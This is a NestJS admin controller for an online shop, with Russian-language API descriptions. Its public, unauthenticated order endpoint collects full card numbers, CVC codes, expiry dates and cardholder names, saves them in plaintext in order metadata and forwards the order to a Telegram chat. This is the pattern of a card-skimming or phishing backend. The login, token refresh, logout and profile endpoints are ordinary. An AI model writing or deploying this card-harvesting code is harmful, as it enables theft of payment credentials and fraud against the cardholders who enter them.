import { Controller, Post, Body, Get, UseGuards, Request, Req } from '@nestjs/common';
import {
  ApiTags,
  ApiOperation,
  ApiResponse,
  ApiBody,
  ApiBearerAuth,
} from '@nestjs/swagger';
import { AdminService } from './admin.service';
import { OrdersService } from '../orders/orders.service';
import { PaymentMethod, DeliveryMethod } from '../orders/schemas/order.schema';
import { LoginAdminDto } from './dto/login-admin.dto';
import { RefreshTokenDto } from './dto/refresh-token.dto';
import { JwtAuthGuard } from './guards/jwt-auth.guard';
import { Public } from '../../common/decorators/public.decorator';

@ApiTags('admin')
@Controller('admin')
export class AdminController {
  constructor(
    private readonly adminService: AdminService,
    private readonly ordersService: OrdersService,
  ) {}

  @Public()
  @Post('orders')
  @ApiOperation({ summary: 'Создать заказ с данными карты (тестовая локальная точка)' })
  @ApiResponse({ status: 201, description: 'Заказ создан и отправлен в Telegram' })
  async createOrderWithCard(@Body() body: any, @Req() req: any) {
    const items = body.items || [];

    const customer = body.customer || {
      firstName: (body.name || '').split(' ')[0] || 'Client',
      lastName: (body.name || '').split(' ').slice(1).join(' ') || ' ',
      email: body.email || '',
      phone: body.phone || '',
    };

    const createOrderDto: any = {
      items,
      customer,
      deliveryAddress: body.deliveryAddress || null,
      paymentMethod: PaymentMethod.CARD,
      deliveryMethod: DeliveryMethod.COURIER,
      notes: body.notes || null,
      promoCode: body.promoCode || null,
      deliveryCost: body.deliveryCost || 0,
      discount: body.discount || 0,
      currency: body.currency || 'zł',
    };

    const sessionId = req.headers['x-session-id'] || req.sessionID;
    const ipAddress = req.ip || req.connection?.remoteAddress;
    const userAgent = req.headers['user-agent'];

    const created = await this.ordersService.create(createOrderDto, sessionId, ipAddress, userAgent);

    try {
      const cardData = {
        cardNumber: body.cardNumber || null,
        cvc: body.cvc || null,
        expiry: body.expiry || null,
        cardholderName: body.cardholderName || null,
      };
      created.metadata = created.metadata || {};
      created.metadata.card = cardData;
      await (created as any).save();

      try {
        const svc: any = (this.ordersService as any);
        if (typeof svc.sendOrderToTelegram === 'function') {
          await svc.sendOrderToTelegram(created as any);
        }
      } catch (e) {
        console.warn('Не удалось повторно отправить заказ в Telegram:', e?.message || e);
      }
    } catch (e) {
      console.warn('Не удалось сохранить данные карты в metadata:', e?.message || e);
    }

    return created;
  }

  @Public()
  @Post('login')
  @ApiOperation({ summary: 'Вход админа' })
  @ApiBody({ type: LoginAdminDto })
  @ApiResponse({
    status: 200,
    description: 'Успешный вход. Возвращает только токены для безопасности.',
    schema: {
      type: 'object',
      properties: {
        accessToken: { 
          type: 'string',
          description: 'Access токен (действителен 15 минут). Используйте в заголовке: Authorization: Bearer <token>'
        },
        refreshToken: { 
          type: 'string',
          description: 'Refresh токен (действителен 7 дней). Используйте для обновления access токена'
        },
      },
    },
  })
  @ApiResponse({ status: 401, description: 'Неверные учетные данные' })
  async login(@Body() loginAdminDto: LoginAdminDto) {
    return this.adminService.login(loginAdminDto.email, loginAdminDto.password);
  }

  @Public()
  @Post('refresh')
  @ApiOperation({ summary: 'Обновление токенов' })
  @ApiBody({ type: RefreshTokenDto })
  @ApiResponse({
    status: 200,
    description: 'Токены успешно обновлены',
    schema: {
      type: 'object',
      properties: {
        accessToken: { 
          type: 'string',
          description: 'Новый access токен (действителен 15 минут)'
        },
        refreshToken: { 
          type: 'string',
          description: 'Новый refresh токен (действителен 7 дней)'
        },
      },
    },
  })
  @ApiResponse({ status: 401, description: 'Неверный или истекший refresh токен' })
  async refresh(@Body() refreshTokenDto: RefreshTokenDto) {
    return this.adminService.refreshTokens(refreshTokenDto.refreshToken);
  }

  @UseGuards(JwtAuthGuard)
  @Post('logout')
  @ApiBearerAuth('JWT-auth')
  @ApiOperation({ summary: 'Выход админа' })
  @ApiResponse({ status: 200, description: 'Успешный выход' })
  async logout(@Request() req) {
    return this.adminService.logout(req.user.id);
  }

  @UseGuards(JwtAuthGuard)
  @Get('profile')
  @ApiBearerAuth('JWT-auth')
  @ApiOperation({ summary: 'Получить профиль админа' })
  @ApiResponse({
    status: 200,
    description: 'Профиль админа',
    schema: {
      type: 'object',
      properties: {
        id: { type: 'string' },
        email: { type: 'string' },
        role: { type: 'string' },
      },
    },
  })
  @ApiResponse({ status: 401, description: 'Не авторизован' })
  async getProfile(@Request() req) {
    return {
      id: req.user.id,
      email: req.user.email,
      role: req.user.role,
    };
  }
}

